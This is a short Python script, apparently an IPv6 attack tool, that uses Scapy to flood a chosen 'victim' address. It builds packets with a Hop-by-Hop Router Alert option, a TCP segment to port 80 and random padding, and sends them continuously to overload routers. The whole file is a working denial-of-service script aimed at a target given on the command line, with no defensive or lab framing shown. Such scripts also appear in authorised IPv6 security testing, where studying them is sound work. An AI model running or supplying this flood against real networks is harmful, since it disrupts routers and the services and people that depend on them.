#!/usr/bin/python
import sys
from scapy.layers.inet import TCP
from scapy.layers.inet6 import IPv6, IPv6ExtHdrHopByHop, RouterAlert
from scapy.packet import Raw
from scapy.sendrecv import srflood
from scapy.volatile import RandShort, RandString

# Ask user to insert value
if len(sys.argv) == 3:
    attacker_ip = sys.argv[1]
    victim_ip = sys.argv[2]
else:
    print("Please insert:\n 1. Source IPv6 address\n 2. Destination IPv6 address")
    sys.exit(1)

# Generate packet
data = Raw(RandString(size=1200))
layer3 = IPv6(src=attacker_ip, dst=victim_ip)
Extension = IPv6ExtHdrHopByHop(options=RouterAlert(value=0)) / \
            TCP(sport=RandShort(), dport=80) / data
packet1 = layer3/Extension/data
print("Flooding the router with fake Router Alert messages")
srflood(packet1)
